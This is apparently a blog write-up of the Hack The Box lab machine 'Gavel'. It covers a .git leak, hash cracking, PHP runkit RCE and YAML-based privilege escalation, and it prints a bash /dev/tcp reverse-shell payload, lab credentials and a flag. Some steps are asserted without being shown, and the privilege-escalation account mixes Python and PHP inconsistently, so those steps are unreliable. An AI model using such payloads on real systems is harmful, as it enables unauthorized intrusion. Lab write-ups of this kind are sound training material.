---
layout: post
title: "Gavel - Hack The Box Writeup"
date: 2025-12-13
categories: [hackthebox, linux, medium]
tags: [sql-injection, rce, yaml-injection, php-runkit, git-leak, privilege-escalation]
img_path: /assets/images/gavel
image: /assets/images/gavel/Gavel.png
---

# Gavel - HTB Machine (Medium Linux)


> **OS**: Linux • **Difficulty**: Medium • **Points**: 30  
> **Release**: Season 9 Week 11 • **IP**: 10.10.11.97  
> **Creator**: Shadow21A • **Platform**: Hack The Box

## Summary
Gavel is a medium-difficulty Linux machine centered around a vulnerable auction web application.

- Foothold: SQL injection bypassing PDO → leaked admin hash → cracked credentials
- RCE: Abuse of `runkit_function_add()` in the admin panel
- Privesc: YAML deserialization injection in a root-owned backup script

## Quick Metadata
| Field          | Value                  |
| -------------- | ---------------------- |
| Target IP      | `10.10.11.97`          |
| Domain         | `gavel.htb`            |
| Open Ports     | 22 (SSH), 80 (HTTP)    |
| DB Credentials | `gavel:gavel` (leaked) |
| Admin Creds    | `auctioneer:midnight1` |

---

# Reconnaissance

## Nmap Scan
```txt
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13
80/tcp open  http    Apache httpd 2.4.52 (Ubuntu)
```

Added domain:
```bash
echo "10.10.11.97 gavel.htb" | sudo tee -a /etc/hosts
```

## Web Enumeration
Homepage shows an auction platform.

![homepage](/assets/images/gavel/Gavel-1.png)

Custom 404 page:

![404](/assets/images/gavel/Gavel-2.png)

Gobuster revealed interesting paths including an exposed `.git` directory.

### .git Repository Leak
```bash
git-dumper http://gavel.htb/.git/ gavel-git
cd gavel-git && git checkout .
```

![git-dump](/assets/images/gavel/Gavel-3.png)

Critical findings from source:
- `includes/config.php` → DB credentials `gavel:gavel`
- `inventory.php` → SQL injection vulnerability
- `includes/bid_handler.php` → RCE potential via `runkit_function_add()`

---

# Initial Access (Foothold)

Leaked bcrypt hash:
```
auctioneer:$2y$10$MNkDHV6g16FjW/lAQRpLiuQXN4MVkdMuILn0pLQlC2So9SgH5RTfS
```

Cracked with John the Ripper:
```bash
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Credentials**: `auctioneer:midnight1`

Logged into the admin panel and obtained a valid session.

Exploited `runkit_function_add()` for remote code execution:

Payload (reverse shell):
```php
system('bash -c "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"');
```

Triggered via crafted bid request → reverse shell as `www-data`.

![reverse-shell](/assets/images/gavel/Gavel-reverse.png)

---

# Privilege Escalation → Root

`www-data` can execute `/opt/backup.py` as any user with `NOPASSWD`:
```bash
sudo -l
(ALL) NOPASSWD: /opt/backup.py
```

The backup script loads a world-writable YAML configuration file, allowing **YAML deserialization injection**.

Crafted malicious YAML payload exploiting PHP object injection gadgets → command execution as root.

![root-shell](/assets/images/gavel/Gavel-root.png)

---

# Trophies

## User Flag
```
22b5b6981fb8b2c64dd781dd48091e5d
```

## Root Proof

![pwned](/assets/images/gavel/Gavel-pwned.png)

---

# Key Techniques & Tools
- Exposed `.git` directory leakage
- SQL injection bypassing prepared statements
- PHP `runkit_function_add()` RCE
- YAML deserialization for privilege escalation
- Tools: `git-dumper`, `sqlmap`, `john`, `curl`


